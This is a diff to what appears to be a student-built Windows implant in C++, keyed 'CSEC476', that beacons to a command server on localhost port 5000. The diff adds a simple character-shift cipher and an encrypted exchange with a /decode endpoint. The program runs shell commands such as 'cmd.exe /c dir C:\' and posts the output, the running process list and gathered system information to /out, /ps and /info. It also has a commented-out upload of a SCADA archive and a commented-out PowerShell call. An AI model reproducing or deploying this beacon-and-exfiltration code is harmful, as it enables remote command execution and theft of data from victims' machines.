@@ -13,6 +13,66 @@ using namespace std;
 #define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
+
+std::string encode(string key, string clear) {
+	string enc = "";
+	char key_c;
+	string enc_c;
+	int placeholder;
+
+	for (int i = 0; i < clear.length(); i++) {
+		key_c = key[i % key.length()];
+		placeholder = int(clear[i]) + int(key_c);
+		enc_c = (placeholder % 127);
+		enc.append(enc_c);
+	}
+	return enc;
+}
+
+std::string decode(string key, string enc) {
+	string dec = "";
+	char key_c;
+	string dec_c;
+	int placeholder;
+
+	for (int i = 0; i < enc.length(); i++) {
+		key_c = key[i % key.length()];
+		placeholder = 127 + int(enc[i]) - int(key_c);
+		dec_c = (placeholder % 127);
+		dec.append(dec_c);
+	}
+	return dec;
+}
+
+
+std::string send_enc(std::string key) {
+	const char* IP = "127.0.0.1";
+	const int PORT = 5000;
+
+	string clear = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+	string result = encode(key, clear);
+
+	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
+	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/decode", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	BOOL reqSuccess =  HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)result.c_str(), result.length());
+	if (reqSuccess) {
+		DWORD receivedData = 0;
+		DWORD chunkSize = 2048;
+		std::string buf;
+		std::string chunk(chunkSize, 0);
+		while (InternetReadFile(hRequestCMD, &chunk[0], chunkSize, &receivedData) && receivedData)
+		{
+			chunk.resize(receivedData);
+			buf += chunk;
+		}
+		return decode(key, buf);
+	}
+
+}
+
+
 //Uploads file to server
 //Params: handle for internet, path of file to upload, server ip, port 
 BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
@@ -310,6 +370,8 @@ int main() {
 	const char* IP = "127.0.0.1";
 	const int PORT = 5000;
 	const int SLEEPTIME = 1001;
+	const std::string key = "CSEC476";
+
 
 
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
@@ -318,8 +380,8 @@ int main() {
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 
 	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
-	//const char* cmd = "cmd.exe /c dir C:\\";
-	const char* cmd = "cmd.exe /c ping google.com";
+	const char* cmd = "cmd.exe /c dir C:\\";
+	//const char* cmd = "cmd.exe /c ping google.com";
 
 	DWORD MAX_CMD_TIME = 5 * (10000000);
 	std::string cmdout = execCmd((char*)cmd, MAX_CMD_TIME);
@@ -330,39 +392,28 @@ int main() {
 	//cout << execCmd((char*)"cmd.exe /c powershell.exe", MAX_CMD_TIME) << "\n";
 
 	//Sends cmd out to server
-	int cmdoutSize = cmdout.length();
-	char* cmdoutAscii = new char[cmdoutSize + 1];
-	strcpy_s(cmdoutAscii, cmdoutSize + 1, cmdout.c_str());
-	cout << cmdoutAscii << "\n";
 	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/out", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	HttpSendRequestA(hRequestCMD, NULL, NULL, cmdoutAscii, cmdoutSize);
+	HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)cmdout.c_str(), cmdout.size());
 
 
-
+	std::string dc = send_enc(key);
+	cout << dc << "\n";
+	//return 0;
 	//doFileUpload(hInternet, (char*)pth, (char*)IP, PORT);
-
 
 
 	//Sends Process List to Server
 	std::string procInfo = getProcToStr();
-	int procInfoSize = procInfo.length();
-	char* procInfoAsciiBuf = new char[procInfoSize + 1];
-	strcpy_s(procInfoAsciiBuf, procInfoSize + 1, procInfo.c_str());
-	cout << procInfoAsciiBuf << "\n";
 	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequestPS = HttpOpenRequestA(hConnectPS, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	HttpSendRequestA(hRequestPS, NULL, NULL, procInfoAsciiBuf, procInfoSize);
+	HttpSendRequestA(hRequestPS, NULL, NULL, (LPVOID)procInfo.c_str(), procInfo.size());
 
 	//Sends all other info to server
 	std::string allInfo = gatherInfo(hInternet);
-	int sze = allInfo.length();
-	char* ai = new char[allInfo.length() + 1];
-	strcpy_s(ai, sze + 1, allInfo.c_str());
-	cout << ai << "\n";
 	HANDLE hConnect2 = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest2 = HttpOpenRequestA(hConnect2, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
-	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, ai, sze);
+	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, (LPVOID)allInfo.c_str(), allInfo.size());
 	if (reqSuccess2) {
 		cout << "success" << "\n";
 	}
